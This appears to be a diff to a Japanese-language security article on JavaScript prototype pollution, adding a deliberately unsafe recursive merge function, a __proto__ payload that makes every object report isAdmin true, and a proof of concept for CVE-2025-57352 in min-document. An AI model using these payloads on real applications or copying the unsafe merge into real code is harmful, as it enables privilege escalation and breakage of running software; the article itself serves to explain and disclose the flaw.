@@ -34,12 +34,50 @@ console.log(newUser.isAdmin); // true
 ### 実際の攻撃シナリオ
 
 ```javascript
+function merge(target, source) {
+  for (let key in source) {
+    if (typeof source[key] === 'object') {
+      if (!target[key]) {
+        target[key] = {};
+      }
+      merge(target[key], source[key]);
+    } else {
+      target[key] = source[key];
+    }
+  }
+  return target;
+}
+
+// 攻撃前
+const normalUser = {};
+console.log(normalUser.isAdmin); // undefined
+
+// __proto__ を使ってプロトタイプを汚染
+const attackPayload = {
+  "__proto__": {
+    "isAdmin": true,
+    "role": "admin"
+  }
+};
+
+merge({}, attackPayload);
+
+// 攻撃後
+const anotherUser = {};
+console.log(anotherUser.isAdmin); // true
+console.log(anotherUser.role); // "admin"
 ```
 
 ### CVE-2025-57352 (min-document) の例
 
 ```javascript
+const clazz = require("min-document/dom-element");
+let instance = new clazz();
+instance.removeAttributeNS('__proto__', 'toString');
+console.log({}.toString ? '':'[DELETE_TRIGGERED]');
 ```
+
+https://github.com/OrangeShieldInfos/PoCs/blob/main/JavaScript/prototype-pollution/CVE-2025-57352/index.js
 
 ## 参考資料
 
@@ -47,6 +85,5 @@ console.log(newUser.isAdmin); // true
 - [Prototype Pollution in min-document · Issue #54 · Raynos/min-document](https://github.com/Raynos/min-document/issues/54)
 - [Fix prototype pollution in removeAttributeNS by jameswassink · Pull Request #55 · Raynos/min-document](https://github.com/Raynos/min-document/pull/55)
 - [NVD - CVE-2025-57352](https://nvd.nist.gov/vuln/detail/CVE-2025-57352)
-- [PoCs/JavaScript/prototype-pollution/CVE-2025-57352/index.js at main · OrangeShieldInfos/PoCs](https://github.com/OrangeShieldInfos/PoCs/blob/main/JavaScript/prototype-pollution/CVE-2025-57352/index.js)
 - [[GHSA-rx8g-88g5-qh64] min-document vulnerable to prototype pollution by G-Rath · Pull Request #6392 · github/advisory-database](https://github.com/github/advisory-database/pull/6392)
 - [min-document vulnerable to prototype pollution | GitLab Advisory Database](https://advisories.gitlab.com/pkg/npm/min-document/CVE-2025-57352/)
